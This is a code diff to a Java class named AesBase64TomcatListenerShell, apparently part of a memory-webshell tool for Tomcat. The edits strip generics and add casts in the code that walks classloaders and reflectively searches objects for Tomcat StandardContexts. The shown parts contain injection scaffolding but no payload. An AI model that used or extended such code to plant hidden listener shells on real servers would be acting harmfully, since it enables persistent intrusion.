@@ -44,7 +44,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
     }
 
     public Class loadClasses(String className) throws ClassNotFoundException {
-        ArrayList<ClassLoader> classLoaders = new ArrayList<>();
+        ArrayList classLoaders = new ArrayList();
         classLoaders.add(this.getClass().getClassLoader());
         try {
             classLoaders.add(Thread.currentThread().getContextClassLoader());
@@ -60,7 +60,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         }
         int loaders = classLoaders.size();
         for (int i = 0; i < loaders; i++) {
-            ClassLoader loader = classLoaders.get(i);
+            ClassLoader loader = (ClassLoader) classLoaders.get(i);
             if (loader!=null){
                 try {
                    return Class.forName(className,true,loader);
@@ -75,7 +75,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
 
     public static Object[] getStandardContexts() throws Throwable {
         HashSet contexts = new HashSet();
-        HashSet<String> blackType = new HashSet<String>();
+        HashSet blackType = new HashSet();
         blackType.add(int.class.getName());
         blackType.add(short.class.getName());
         blackType.add(long.class.getName());
@@ -106,7 +106,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         }
         return contexts.toArray();
     }
-    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDepth,int currentDepth)throws Throwable {
+    public static Object searchObject(String targetClassName, Object object, HashSet blacklist,HashSet blackType,int maxDepth,int currentDepth)throws Throwable {
         currentDepth++;
 
         if (currentDepth >= maxDepth){
@@ -123,14 +123,14 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
             if (!blacklist.contains(hash)) {
                 blacklist.add(new Integer(hash));
                 Field[] fields = null;
-                ArrayList<Field> fieldsArray = new ArrayList();
+                ArrayList fieldsArray = new ArrayList();
                 Class objClass = object.getClass();
                 while (objClass != null){
                     Field[] fields1 = objClass.getDeclaredFields();
                     fieldsArray.addAll(Arrays.asList(fields1));
                     objClass = objClass.getSuperclass();
                 }
-                fields = fieldsArray.toArray(new Field[0]);
+                fields = (Field[]) fieldsArray.toArray(new Field[0]);
 
 
                 for (int i = 0; i < fields.length; i++) {
